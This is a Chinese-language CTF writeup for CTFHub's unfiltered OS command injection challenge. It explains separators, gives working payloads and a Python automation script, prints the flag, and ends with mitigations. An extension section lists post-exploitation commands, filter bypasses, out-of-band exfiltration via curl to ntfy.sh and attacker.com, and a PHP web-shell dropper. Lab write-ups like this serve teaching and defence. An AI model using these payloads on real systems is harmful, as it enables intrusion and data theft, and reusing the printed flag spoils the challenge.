---
layout: post
title: CTFHub - 命令注入 无过滤 Writeup
platform: ctfhub
date: 2026-10-23 19:36:00 +0800
categories: CTF
---

CTFHub - 命令注入 无过滤 Writeup

一、题目信息

- 平台：CTFHub（技能树 → Web → **命令注入** → 无过滤）
- 题型：Web
- 考点：**OS 命令注入**、命令分隔符


```text
★ 页面源码（show_source 白给）：

    <?php
    $res = FALSE;
    if (isset($_GET['ip']) && $_GET['ip']) {
        $cmd = "ping -c 4 {$_GET['ip']}";      // ★ 直接拼接，无任何过滤
        exec($cmd, $res);
    }
    ?>
    ...
    <pre>
    <?php if ($res) { print_r($res); } ?>      // ★ 输出命令结果
    </pre>

    ★ exec() 的输出是【数组】，每行一个元素，用 print_r 打印

★ 注入原理：

    拼出来的命令：ping -c 4 127.0.0.1; whoami
                                        └──┬──┘
                                    分号：执行完 ping 再执行 whoami

★ 实测（用 ; 分隔）：

    ?ip=127.0.0.1; whoami
    → Array( [0]=>PING..., ..., [9]=>www-data )

    ?ip=127.0.0.1; id
    → [9] => uid=82(www-data) gid=82(www-data) groups=82(www-data)

    ?ip=127.0.0.1; pwd
    → [9] => /var/www/html

★ 用 | 更干净（ping 的输出被丢掉了）：

    ?ip=127.0.0.1|ls /
    → Array( [0]=>bin [1]=>dev [2]=>etc ... )
    ★ 没有 ping 的噪音了

★ 找 flag：

    ?ip=127.0.0.1|ls -la /var/www/html
    → -rw-r--r-- 1 root root 42 29086179361629.php      ← ★ 42 字节

    ?ip=127.0.0.1|cat /var/www/html/29086179361629.php
    → <?php // ctfhub{38ee3e781d1b92ceeab10fbf}

flag         : ctfhub{38ee3e781d1b92ceeab10fbf}
```

二、题目分析

**① 什么是命令注入**

```php
$cmd = "ping -c 4 {$_GET['ip']}";
exec($cmd, $res);
```

**正常的输入**：

```
?ip=127.0.0.1
→ 执行：ping -c 4 127.0.0.1
→ 输出 ping 的结果
```

**恶意的输入**：

```
?ip=127.0.0.1; whoami
→ 执行：ping -c 4 127.0.0.1; whoami
                              └──┬──┘
                         shell 看到分号，把命令切成两条

→ 先跑 ping，再跑 whoami
→ 两条命令的输出都被 exec 捕获
```

**★ 核心问题**：

```
程序把【用户输入】当成了【命令的一部分】
而 shell 会把输入里的特殊字符（; | & 等）当成【命令分隔符】
→ 用户就能"插入"自己的命令
```

**② 命令分隔符大全（重要）**

| 分隔符 | 含义 | 例子 | 特点 |
|---|---|---|---|
| `;` | 顺序执行 | `a; b` | 两条都执行，输出都保留 |
| `\|` | 管道 | `a \| b` | a 的输出作为 b 的输入 |
| `\|\|` | 或 | `a \|\| b` | a 失败才执行 b |
| `&&` | 且 | `a && b` | a 成功才执行 b |
| `&` | 后台 | `a & b` | a 放后台，b 立即执行 |
| `` ` `` | 命令替换 | ``echo `id` `` | 先执行 id，结果替换进去 |
| `$()` | 命令替换 | `echo $(id)` | 同上，更现代 |
| `%0a` | 换行 | `a%0ab` | URL 里的换行也是分隔符 |
| `%0d` | 回车 | | |
| `>` `<` | 重定向 | `a > /tmp/x` | 输出到文件 |

**★ 本题实测可用的**：`;`、`|`

**③ 为什么 `|` 的输出更干净**

```bash
# 用 ;
ping -c 4 127.0.0.1; ls /
→ 输出 = ping 的输出 + ls 的输出（都进了 exec 的数组）

# 用 |
ping -c 4 127.0.0.1 | ls /
→ ping 的 stdout 被【管道】接到了 ls 的 stdin（ls 不读 stdin，丢弃）
→ ls 的 stdout 被 exec 捕获
→ 只有 ls 的输出 ✅
```

**★ 实战技巧：用 `|` 可以过滤掉原命令的噪音，输出更清晰。**

**如果连 `|` 都被过滤**，可以用：

```bash
ping -c 4 127.0.0.1; ls /        # 有噪音但能看
ping -c 4 127.0.0.1 2>&1 >/dev/null; ls /     # 丢弃 ping 输出
```

**④ `exec()` 的输出结构**

```php
exec($cmd, $res);
// $res 是【数组】，命令输出的每一行是一个元素
```

**print_r 打印出来**：

```
Array
(
    [0] => 第一行
    [1] => 第二行
    ...
)
```

**★ 所以要找 flag，就在数组的某个元素里。**

**⑤ 执行命令的函数对比**

| 函数 | 输出 | 返回值 |
|---|---|---|
| `exec($cmd, $out)` | 存入 `$out` 数组 | 最后一行 |
| `system($cmd)` | **直接输出** | 最后一行 |
| `shell_exec($cmd)` | 返回字符串 | 全部输出 |
| `passthru($cmd)` | **直接输出**（二进制安全）| 无 |
| `` `$cmd` `` | 返回字符串 | 全部输出 |
| `popen($cmd, 'r')` | 需要 fread | 文件指针 |
| `proc_open(...)` | 更底层 | 进程资源 |

**★ 本题用的是 `exec`，所以输出在数组里（print_r 打印）。**

三、解题步骤

**第 1 步：看源码**

```
页面底部 show_source(__FILE__) 直接显示源码

    $cmd = "ping -c 4 {$_GET['ip']}";
    exec($cmd, $res);

★ 确认：拼接点、无过滤、输出可读
```

**第 2 步：验证注入**

```
?ip=127.0.0.1; whoami
→ 数组最后一行出现 www-data      ✅ 成功
```

**第 3 步：用 `|` 获得干净输出**

```
?ip=127.0.0.1|ls /
→ 只有目录列表，没有 ping 噪音
```

**第 4 步：找 flag**

```
?ip=127.0.0.1|ls -la /var/www/html
→ 29086179361629.php   ← 42 字节，可疑

?ip=127.0.0.1|cat /var/www/html/29086179361629.php
→ <?php // ctfhub{38ee3e781d1b92ceeab10fbf}
```

**第 5 步：提交 → 通关**

---

**手工操作（浏览器）**

```
① 打开题目页面
② 在 IP 输入框里填：

   127.0.0.1; whoami

③ 点 Ping
④ 页面下方 <pre> 里出现 www-data

⑤ 再试：

   127.0.0.1|ls -la /var/www/html

⑥ 看到 flag 文件名

⑦ 再试：

   127.0.0.1|cat /var/www/html/29086179361629.php

⑧ 拿到 flag
```

**★ 输入框里可以直接写分号和空格，浏览器会自动编码。**

---

**自动化脚本**

```python
import ssl, urllib.parse, urllib.request, re

CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE

BASE = "http://challenge-xxx:10800"


def run(payload):
    u = BASE + "/?ip=" + urllib.parse.quote(payload, safe="")
    with urllib.request.urlopen(u, context=CTX, timeout=30) as r:
        body = r.read().decode('utf-8', 'replace')
    m = re.search(r'<pre>\s*(.*?)\s*</pre>', body, re.S)
    return m.group(1).strip() if m else ""


# 用 | 避免 ping 噪音
print(run("127.0.0.1|ls -la /var/www/html"))
print(run("127.0.0.1|cat /var/www/html/29086179361629.php"))
```

**★ 用 `re.search(r'<pre>(.*?)</pre>')` 提取输出，去掉 HTML 噪音。**

四、延伸知识

**① 命令注入的常见入口**

```php
// 网络工具
system("ping -c 4 " . $_GET['ip']);
exec("nslookup " . $_GET['host']);
system("curl " . $_GET['url']);

// 文件处理
system("convert " . $_GET['file'] . " out.png");
system("tar -czf backup.tar " . $_GET['dir']);
system("ffmpeg -i " . $_GET['video'] . " out.mp4");

// 系统运维
system("ps aux | grep " . $_GET['user']);
system("df -h " . $_GET['path']);

// 备份/导出
system("mysqldump " . $_GET['db'] . " > backup.sql");
```

**★ 凡是"把用户输入拼进 shell 命令"的地方，都可能有命令注入。**

**② 命令注入 vs 代码注入 vs 文件包含**

| 类型 | 注入点 | 你能写什么 | 例子 |
|---|---|---|---|
| **命令注入** | `system()` / `exec()` / 反引号 | **shell 命令** | `?ip=;whoami` |
| 代码注入 | `eval()` / `assert()` | **PHP 代码** | `?cmd=system('id');` |
| 文件包含 | `include()` | **文件路径 / 协议** | `?file=shell.txt` |
| SQL 注入 | SQL 查询 | **SQL 语句** | `?id=1 union select...` |
| XSS | HTML 输出 | **HTML/JS** | `?name=<script>` |

**③ 常用命令速查（拿到 RCE 后）**

```bash
# 身份
whoami; id; hostname

# 目录
pwd; ls -la; ls -la /

# 找 flag
find / -name "*flag*" 2>/dev/null
grep -r "ctfhub{" / 2>/dev/null
ls -la /var/www/html

# 读文件
cat /flag; more /flag; less /flag; head /flag; tail /flag

# 系统信息
uname -a; cat /etc/os-release; cat /etc/passwd

# 网络
ip a; ifconfig; netstat -an

# 提权
sudo -l; find / -perm -4000 -type f 2>/dev/null
```

**④ 如果被过滤了怎么办（预告后面的题）**

**（1）过滤空格**

```bash
cat${IFS}/flag          # ${IFS} = 空格
cat$IFS/flag
cat</flag               # 重定向代替空格
cat</etc/passwd
{cat,/flag}             # 花括号展开
cat%09/flag             # Tab
```

**（2）过滤 cat**

```bash
tac /flag               # 倒序输出
more /flag
less /flag
head /flag
tail /flag
nl /flag
od -c /flag
strings /flag
rev /flag
paste /flag
sort /flag
uniq /flag
vi /flag; cat /flag     # 用 vi 读
ca\t /flag              # 反斜杠（bash 会忽略）
c""at /flag
c'a't /flag
/bin/cat /flag
```

**（3）过滤关键字（如 flag）**

```bash
cat /f*                 # 通配符
cat /fla?
cat /[f]lag
cat /fl''ag
cat $(echo L2ZsYWc= | base64 -d)      # Base64
cat /fl`echo ag`                      # 命令替换拼接
```

**（4）过滤分隔符**

```bash
%0a                     # 换行
%0d
%09                     # Tab
${IFS}
$IFS$9
```

**（5）无回显（盲注）**

```bash
# 时间盲注
;sleep 5
;ping -c 5 127.0.0.1

# 外带（DNS/HTTP）
;curl http://ntfy.sh/topic/$(whoami)
;ping -c 1 `whoami`.attacker.com

# 写文件（如果能访问）
;echo "<?php system(\$_GET[1]);?>" > /var/www/html/x.php
```

**⑤ 防护**

```text
① ★ 不要用 shell 执行命令
    PHP: 用 escapeshellarg() / escapeshellcmd()
    escapeshellarg($ip)   → 把输入包在单引号里，特殊字符失效
    
    exec("ping -c 4 " . escapeshellarg($_GET['ip']));

② ★ 用参数化/白名单
    if (!filter_var($ip, FILTER_VALIDATE_IP)) die("非法 IP");
    → 只允许合法 IP 格式

③ ★ 避免 shell，用语言内置功能
    PHP: 用 fsockopen 代替 ping
    用 file_get_contents 代替 curl
    → 完全不经过 shell

④ 最小权限运行（www-data 而不是 root）
⑤ 容器隔离（本题是 Docker，所以只影响容器）
⑥ 禁用危险函数
    disable_functions = system,exec,shell_exec,passthru,popen,proc_open
```

五、总结

- **本题核心：`exec("ping -c 4 {$_GET['ip']}")` 直接拼接 → `;` 或 `|` 注入任意命令。**
- 一条 payload：

```
?ip=127.0.0.1|cat /var/www/html/29086179361629.php
```

- **三个必记要点**：

```text
① 命令分隔符：; | || && & ` $() %0a
   —— 任一没被过滤就能注入
② 用 | 可以过滤掉原命令（ping）的噪音，输出更干净
③ exec() 的输出是数组，print_r 打印，flag 在某个元素里
```

- **实测 flag**：

```text
ctfhub{38ee3e781d1b92ceeab10fbf}
（在 /var/www/html/29086179361629.php）
```

**手工复现要点**：

```text
· 看源码（show_source 白给）→ 确认拼接点
· 试 ; whoami → 有回显就成功了
· 换 | 让输出干净
· ls -la /var/www/html → 找 flag 文件
· cat 它
```

**一句话记忆**：

```
┌────────────────────────────────────────────────────────┐
│  命令注入 = 把用户输入当"命令的一部分"                    │
│                                                        │
│  shell 的特殊字符是"分隔符"：                            │
│      ;  顺序    |  管道    &&  与    ||  或    &  后台  │
│      ` `  命令替换   $()  命令替换   %0a  换行          │
│                                                        │
│  ★ 只要有一个没被过滤，就能执行任意命令                  │
│  ★ 一个命令注入 = 整台服务器（在权限范围内）              │
└────────────────────────────────────────────────────────┘
```
